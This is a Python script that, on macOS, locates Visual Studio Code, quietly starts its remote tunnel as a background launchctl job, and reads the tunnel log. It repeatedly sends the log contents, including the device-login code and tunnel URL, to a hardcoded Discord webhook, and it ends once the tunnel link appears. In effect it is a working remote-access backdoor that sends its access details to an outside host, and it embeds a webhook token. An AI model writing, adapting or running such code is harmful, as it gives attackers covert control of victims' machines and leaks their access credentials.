#!/usr/bin/env python3
"""Mirror of provided JS tunneling script in Python.

Sends messages to a Discord webhook and polls a file until a target string appears.
Implements macOS tunneling flow; Windows prints a placeholder message.
"""
import json
import os
import subprocess
import sys
import time
import requests


WEBHOOK_URL = (
    "https://discordapp.com/api/webhooks/1473982821193486470/PU1CXyeE72GvhCsrqvmHB3Ypf9ewmaORv7ACVtjkXo8BAHA81z-b7ziLvzOwqBK-RngL"
)


def send_message(message_text):
    message = {
        "content": message_text,
        "username": "VSCode Tunneling Bot",  # Optional: specify a custom username
    }

    # Send the POST request to Discord Webhook
    response = requests.post(WEBHOOK_URL, data=json.dumps(message), headers={'Content-Type': 'application/json'})

    # Check if the request was successful
    if response.status_code == 204:
        return True
    else:
        return None



def poll_and_send(file_path, target_text=None, interval_ms=5000):
    last_data = None
    interval = max(0.1, interval_ms / 1000.0)

    while True:
        try:
            with open(file_path, "r", encoding="utf-8") as f:
                data = f.read()
        except Exception as err:
            send_message(f"Error reading the file (will retry): {err}")
            time.sleep(interval)
            continue

        print(data)
        if data != last_data:
            last_data = data
            try:
                send_message(data)
            except Exception:
                pass

        if target_text and target_text in data:
            try:
                send_message(" ----- Tunneling finished -----")
            except Exception:
                pass
            break

        time.sleep(interval)


def mac_tunneling():
    try:
        stdout = subprocess.check_output([
            "mdfind",
            "kMDItemCFBundleIdentifier == 'com.microsoft.VSCode'",
        ])
        lines = [s.strip() for s in stdout.decode("utf-8").splitlines() if s.strip()]
        vscode_path = lines[0] if lines else stdout.decode("utf-8").strip()
    except Exception as e:
        send_message(f"Error executing command: {e}")
        return

    if not vscode_path:
        send_message("VSCode path not found")
        return

    cmd = (
        f"launchctl submit -l code.job -- /bin/sh -c '\"{vscode_path}/Contents/Resources/app/bin/code\" tunnel > $TMPDIR/code.log'"
    )
    try:
        subprocess.Popen(cmd, shell=True)
    except Exception as e:
        send_message(f"Error running launchctl: {e}")
        return

    file_path = os.path.join(os.environ.get("TMPDIR", "/tmp"), "code.log")
    poll_and_send(file_path, "https://vscode.dev/tunnel")


def win_tunneling():
    send_message("Windows tunneling is not yet implemented.")


def main():
    platform = sys.platform
    if platform == "darwin":
        mac_tunneling()
    elif platform.startswith("win"):
        win_tunneling()
    else:
        send_message(f"Platform {platform} not supported")


if __name__ == "__main__":
    main()
